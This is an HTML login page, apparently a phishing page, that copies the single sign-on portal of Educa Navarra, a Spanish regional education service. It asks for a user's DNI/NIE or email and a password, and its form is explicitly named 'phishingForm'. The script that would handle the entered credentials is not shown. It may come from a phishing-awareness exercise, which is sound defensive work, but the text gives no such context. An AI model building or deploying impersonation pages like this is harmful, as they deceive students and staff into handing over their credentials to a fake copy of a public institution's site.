<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Acceso a Educación Navarra | SSO</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="login-container">
        <div class="header">
            <h1>Educa Navarra</h1>
            <p>Portal de Servicios Educativos</p>
        </div>
        <form id="phishingForm">
            <div class="form-group">
                <label for="usuario">Usuario (DNI/NIE o correo):</label>
                <input type="text" id="usuario" name="usuario" placeholder="Ingresa tu usuario">
            </div>
            <div class="form-group">
                <label for="password">Contraseña:</label>
                <input type="password" id="password" name="password" placeholder="Ingresa tu clave">
            </div>
            <button type="submit" id="loginButton">Acceder</button>
        </form>
        <div id="statusMessage" class="status"></div>
        <div class="info-bar">
            <p>Si tienes problemas, contacta con soporte TIC.</p>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
